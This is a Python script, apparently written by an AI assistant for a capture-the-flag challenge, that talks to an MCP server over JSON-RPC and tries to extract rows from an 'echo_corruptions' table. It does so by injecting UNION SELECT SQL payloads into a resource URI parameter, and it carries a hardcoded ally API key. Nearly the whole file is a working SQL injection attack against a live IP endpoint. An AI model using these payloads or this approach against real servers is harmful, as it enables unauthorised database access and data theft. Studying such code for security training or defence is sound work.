#!/usr/bin/env python3
"""
Get Corruption Data via SQL Injection
Author: Claude
Purpose: Extract corruption data for Echo 7 using SQL injection
Created: 2025-11-23
Updated: 2025-11-23
Expected Result: Get corruption types and values for Echo 7
Produced Result: TBD
"""

import requests
import json

MCP_URL = "http://154.57.164.74:31735/mcp/"
ALLY_KEY = "24a707bb346e2de34aab5d5349591599684a0e7d6280e5750aad30df3a8e38e0"

class MCPClient:
    def __init__(self, url):
        self.url = url
        self.session_id = None
        self.msg_id = 0

    def send_request(self, method, params=None):
        self.msg_id += 1
        payload = {
            "jsonrpc": "2.0",
            "method": method,
            "params": params or {},
            "id": self.msg_id
        }
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/event-stream"
        }
        if self.session_id:
            headers["mcp-session-id"] = self.session_id
        resp = requests.post(self.url, json=payload, headers=headers)
        if "mcp-session-id" in resp.headers:
            self.session_id = resp.headers["mcp-session-id"]
        if resp.text.startswith("event:"):
            lines = resp.text.strip().split('\n')
            for line in lines:
                if line.startswith("data: "):
                    return json.loads(line[6:])
        return resp.json()

    def initialize(self):
        return self.send_request("initialize", {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "explorer", "version": "1.0"}
        })

    def read_resource(self, uri):
        return self.send_request("resources/read", {"uri": uri})

client = MCPClient(MCP_URL)
client.initialize()

print("="*60)
print("Getting Corruption Data for Echo 7")
print("="*60)

# First, let's see what a cured echo looks like
print("\n[*] Checking Echo 2 (Cured) for comparison:")
echo2 = client.read_resource("ash-data://echo/profile/2")
if "result" in echo2:
    echo2_data = json.loads(echo2["result"]["contents"][0]["text"])
    print(json.dumps(echo2_data, indent=2))

print("\n[*] Checking Echo 9 (Cured with 2 purged corruptions):")
echo9 = client.read_resource("ash-data://echo/profile/9")
if "result" in echo9:
    echo9_data = json.loads(echo9["result"]["contents"][0]["text"])
    print(json.dumps(echo9_data, indent=2))

# Now try to extract corruption data via SQL injection
# The ally/status query likely returns: ally_id, ally_name, status, api_key
# We need 4 columns to match

print("\n" + "="*60)
print("Trying SQL Injection to get corruptions")
print("="*60)

# Try different column counts
sqli_payloads = [
    # Get corruption ID, type, value, purge status
    f"{ALLY_KEY}' UNION SELECT id, corruption_type, corruption_value, purge_status FROM echo_corruptions WHERE echo_id=7--",
    # Get echo_id, id, type, value
    f"{ALLY_KEY}' UNION SELECT echo_id, id, corruption_type, corruption_value FROM echo_corruptions WHERE echo_id=7--",
]

for i, payload in enumerate(sqli_payloads):
    print(f"\n[*] Payload {i+1}:")
    result = client.read_resource(f"ash-data://ally/status/{payload}")
    if "error" in result:
        print(f"  Error: {result['error']['message']}")
    else:
        print(f"  Success!")
        print(json.dumps(result, indent=2))
